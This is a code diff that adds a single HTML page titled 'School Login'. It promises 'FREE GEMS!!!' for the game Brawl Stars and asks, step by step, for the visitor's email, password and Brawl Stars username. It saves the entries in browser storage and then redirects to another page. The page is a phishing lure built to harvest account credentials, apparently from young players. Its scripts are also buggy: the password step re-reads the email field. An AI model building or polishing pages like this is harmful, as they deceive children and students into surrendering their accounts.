@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>School Login</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+
+      /* 🌄 Background image */
+      background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToDlytiE178sfY8uXNj7aIesE2rM7gGOwjFCmb9VVEWJ7JAoUDaNYQZxuRG5iFNXAxvJRJAA&s=10");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    /* 🌧️ Rain layer */
+    #rain {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .rain-item {
+      position: absolute;
+      width: 35px;
+      height: 35px;
+      background-image: url("https://kboosting.com/img/29052/c/gems-500x500.png");
+      background-size: cover;
+      animation: fall linear infinite;
+      opacity: 0.7;
+    }
+
+    @keyframes fall {
+      0% {
+        transform: translateY(-60px) rotate(0deg);
+      }
+      100% {
+        transform: translateY(110vh) rotate(360deg);
+      }
+    }
+
+    /* 🧾 Login card */
+    .card {
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(5px);
+      padding: 30px;
+      border-radius: 15px;
+      width: 320px;
+      text-align: center;
+      z-index: 2;
+      position: relative;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #5f9cff;
+      color: white;
+      cursor: pointer;
+      font-size: 15px;
+    }
+
+    button:hover {
+      background: #4a84e0;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+<!-- 🌧️ Rain -->
+<div id="rain"></div>
+
+<!-- Login box -->
+<div class="card">
+  <h1>FREE GEMS!!!</h1>
+  <h2>register for GEMS</h2>
+
+  <div id="step1">
+    <input type="email" id="email" placeholder="Enter email">
+    <button onclick="next()">Next</button>
+  </div>
+
+  <div id="step2" class="hidden">
+    <input type="password" id="code" placeholder="Enter password">
+    <button onclick="next2()">Submit</button>
+  </div>
+ <div id="step3" class="hidden">
+    <input type="text" id="code" placeholder="Enter your brawl stars username">
+    <button onclick="finish()">Submit</button>
+  </div>
+</div>
+
+<script>
+/* 🌧️ Create rain effect */
+function createRain() {
+  const rain = document.getElementById("rain");
+
+  for (let i = 0; i < 30; i++) {
+    let drop = document.createElement("div");
+    drop.classList.add("rain-item");
+
+    drop.style.left = Math.random() * 100 + "vw";
+    drop.style.animationDuration = (Math.random() * 3 + 2) + "s";
+    drop.style.opacity = Math.random();
+
+    rain.appendChild(drop);
+  }
+}
+
+createRain();
+
+/* 🔐 Step 1 */
+function next() {
+  const email = document.getElementById("email").value.trim();
+
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (!emailPattern.test(email)) {
+    alert("Enter a valid email");
+    return;
+  }
+
+  localStorage.setItem("studentEmail", email);
+
+  document.getElementById("step1").classList.add("hidden");
+  document.getElementById("step2").classList.remove("hidden");
+}
+function next2() {
+  const email = document.getElementById("email").value.trim();
+
+  if (!email) return alert("password");
+
+  localStorage.setItem("studentEmail", email);
+
+  document.getElementById("step2").classList.add("hidden");
+  document.getElementById("step3").classList.remove("hidden");
+}
+
+
+/* ✅ Save order (multiple support) */
+function finish() {
+  const code = document.getElementById("code").value.trim();
+  const email = localStorage.getItem("studentEmail");
+
+  if (!code) {
+    alert("Enter password");
+    return;
+  }
+
+  let orders = JSON.parse(localStorage.getItem("orders")) || [];
+
+  orders.push({
+    email: email,
+    classCode: code,
+    time: new Date().toLocaleString()
+  });
+
+  localStorage.setItem("orders", JSON.stringify(orders));
+
+  window.location.href = "alt.html";
+}
+</script>
+
+</body>
+</html>
